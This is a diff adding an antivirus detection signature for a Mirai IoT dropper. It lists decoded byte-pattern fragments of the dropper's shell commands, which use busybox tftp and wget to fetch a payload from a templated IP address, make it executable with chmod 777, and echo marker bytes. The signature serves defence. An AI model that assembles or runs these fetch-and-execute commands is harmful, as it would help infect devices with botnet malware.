@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Dropper.Mirai-9407828-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1)&(2&3&4)
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd %s && (/bin/busybox tftp -g -r 81c4603681c46036/81c4603681c46036.%s %u.%u.%u.%u || /bin/busybox tftp -g -f 81c4603681c46036/
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox wget -O - http://%u.%u.%u.%u/81c4603681c46036/81c4603681c46036.%s > %s/81c4603681c46036.%s && /bin/busybox chmod 7
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+81c4603681c46036.%s %u.%u.%u.%u) && /bin/busybox chmod 777 %s/81c4603681c46036.%s && 
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox echo -ne '\x0181c46036\x01' || /bin/busybox echo -ne '\x0281c46036\x01'
